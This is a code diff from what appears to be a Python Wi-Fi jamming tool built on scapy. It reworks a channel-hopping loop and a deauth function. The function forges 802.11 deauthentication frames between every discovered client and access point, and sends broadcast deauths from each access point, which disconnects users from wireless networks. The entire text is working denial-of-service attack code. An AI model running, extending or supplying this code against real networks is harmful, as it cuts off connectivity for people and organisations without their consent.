@@ -462,15 +462,15 @@ def channel_hop2(mon_iface):
     5 seconds in order to populate the deauth list nicely.
     After that it goes as fast as it can
     '''
-    global monchannel, first_pass, args
+    global monchannel, first_pass, args, jamming_daemon_running
 
     channelNum = 0
 
-    while 1:
-        if args.channel:
-            with lock:
-                monchannel = args.channel
-        else:
+    if args.channel:
+        with lock:
+            monchannel = args.channel
+    while jamming_daemon_running:
+        if not args.channel:
             channelNum += 1
             if channelNum > 11:
                 channelNum = 1
@@ -497,56 +497,55 @@ def deauth(monchannel):
     and starts a thread to deauth each instance
     '''
 
-    global clients_APs, APs, args, jamming_daemon_running
+    global clients_APs, APs, args
 
     pkts = []
 
-    while jamming_daemon_running:
-        if len(clients_APs) > 0:
+    if len(clients_APs) > 0:
+        with lock:
+            for x in clients_APs:
+                client = x[0]
+                ap = x[1]
+                ch = x[2]
+                '''
+                Can't add a RadioTap() layer as the first layer or it's a
+                malformed Association request packet?
+                Append the packets to a new list so we don't have to hog the
+                lock type=0, subtype=12?
+                '''
+                if ch == monchannel:
+                    deauth_pkt1 = Dot11(
+                        addr1=client,
+                        addr2=ap,
+                        addr3=ap) / Dot11Deauth()
+                    deauth_pkt2 = Dot11(
+                        addr1=ap,
+                        addr2=client,
+                        addr3=client) / Dot11Deauth()
+                    pkts.append(deauth_pkt1)
+                    pkts.append(deauth_pkt2)
+    if len(APs) > 0:
+        if not args.directedonly:
             with lock:
-                for x in clients_APs:
-                    client = x[0]
-                    ap = x[1]
-                    ch = x[2]
-                    '''
-                    Can't add a RadioTap() layer as the first layer or it's a
-                    malformed Association request packet?
-                    Append the packets to a new list so we don't have to hog the
-                    lock type=0, subtype=12?
-                    '''
+                for a in APs:
+                    ap = a[0]
+                    ch = a[1]
                     if ch == monchannel:
-                        deauth_pkt1 = Dot11(
-                            addr1=client,
+                        deauth_ap = Dot11(
+                            addr1='ff:ff:ff:ff:ff:ff',
                             addr2=ap,
                             addr3=ap) / Dot11Deauth()
-                        deauth_pkt2 = Dot11(
-                            addr1=ap,
-                            addr2=client,
-                            addr3=client) / Dot11Deauth()
-                        pkts.append(deauth_pkt1)
-                        pkts.append(deauth_pkt2)
-        if len(APs) > 0:
-            if not args.directedonly:
-                with lock:
-                    for a in APs:
-                        ap = a[0]
-                        ch = a[1]
-                        if ch == monchannel:
-                            deauth_ap = Dot11(
-                                addr1='ff:ff:ff:ff:ff:ff',
-                                addr2=ap,
-                                addr3=ap) / Dot11Deauth()
-                            pkts.append(deauth_ap)
+                        pkts.append(deauth_ap)
 
-        if len(pkts) > 0:
-            # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
-            if not args.timeinterval:
-                args.timeinterval = 0
-            if not args.packets:
-                args.packets = 1
+    if len(pkts) > 0:
+        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
+        if not args.timeinterval:
+            args.timeinterval = 0
+        if not args.packets:
+            args.packets = 1
 
-            for p in pkts:
-                send(p, inter=float(args.timeinterval), count=int(args.packets))
+        for p in pkts:
+            send(p, inter=float(args.timeinterval), count=int(args.packets))
 
 
 def output(monchannel):
